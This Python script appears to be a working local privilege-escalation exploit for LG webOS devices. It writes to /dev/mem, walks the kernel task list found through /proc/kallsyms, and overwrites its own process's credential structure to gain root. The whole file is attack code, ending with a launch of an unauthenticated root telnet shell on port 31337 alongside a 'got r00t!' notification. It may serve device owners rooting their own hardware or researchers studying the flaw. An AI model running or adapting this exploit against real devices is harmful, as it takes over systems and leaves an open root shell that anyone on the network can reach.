import os
import struct
import sys

TESTING = os.getuid() == 0
PTRSIZE = 4

if TESTING:
	print("[*] TEST MODE: dropping privs to wam:compositor")
	os.setresgid(505, 505, 505)
	os.setresuid(505, 505, 505)
else:
	sys.stdout = open("/tmp/devmemes.log", "w")

ksyms = {}
for line in open("/proc/kallsyms").readlines():
	addr, x, symbol = line.strip().split(" ")
	ksyms[symbol] = int(addr, 16)

# this heuristic seems to work on most webos devices
kernel_slide = ksyms["_text"] & ~0xFFFFFF

def kern2phys(addr):
	return addr - kernel_slide

# note: doing 64-bit seeks on 64-bit devices will probably require
# using ctypes, due to python2 limitations
mem = open("/dev/mem", "wb+", 0)

def parse_pid(addr):
	mem.seek(kern2phys(addr)+28)
	pid = struct.unpack("<I", mem.read(4))[0]
	return pid
	

ruid, euid, suid = os.getresuid()
rgid, egid, sgid = os.getresgid()

cred = struct.pack("<IIIIIIII", ruid, rgid, suid, sgid, euid, egid, ruid, rgid)
testcred = struct.pack("<IIIIIIII", ruid, rgid, suid, 0, euid, egid, ruid, rgid)

def try_patch(addr):
	mem.seek(addr)
	thiscred = mem.read(32)
	if thiscred != cred:
		return False

	# set the saved gid to 0 as a test -
	# if our own saved gid changes, we know we've found the right cred
	mem.seek(addr)
	mem.write(testcred)
	mem.flush()
	mem.seek(addr)
	if os.getresgid()[2] == 0:
		mem.write("\0"*32) # make ourselves fully root
		mem.flush()
		print("ROOTED")
		return True
	else:
		mem.write(cred) # put it back
		mem.flush()
		return False
	


visited = set()
# https://elixir.bootlin.com/linux/v4.4.84/source/include/linux/sched.h#L1390
def parse_task(addr):
	if addr in visited:
		print("Visited all tasks")
		raise Exception("Visited all tasks")

	visited.add(addr)

	mem.seek(kern2phys(addr))
	task = mem.read(4096)

	prev, next = struct.unpack("<II", task[664:664+8])
	pid = struct.unpack("<I", task[892:892+4])[0]
	cred = struct.unpack("<I", task[1064:1064+4])[0]

	print("this: " + hex(addr))
	print("pid: " + hex(pid))
	if pid:
		print(parse_pid(pid)) # TODO: figure out why this doesn't work
	print("cred: " + hex(cred))
	print(hex(prev), hex(next))

	if try_patch(kern2phys(cred + 4)):
		return

	if next:
		parse_task(next-668)


parse_task(ksyms["init_task"])

if TESTING:
	os.system("id")
else:
	os.system("""luna-send -a wampage -f -n 1 luna://com.webos.notification/createToast '{"sourceId":"wampage","message":"WAMpage: got r00t!"}' &""")
	os.system("telnetd -l /bin/sh -p 31337")
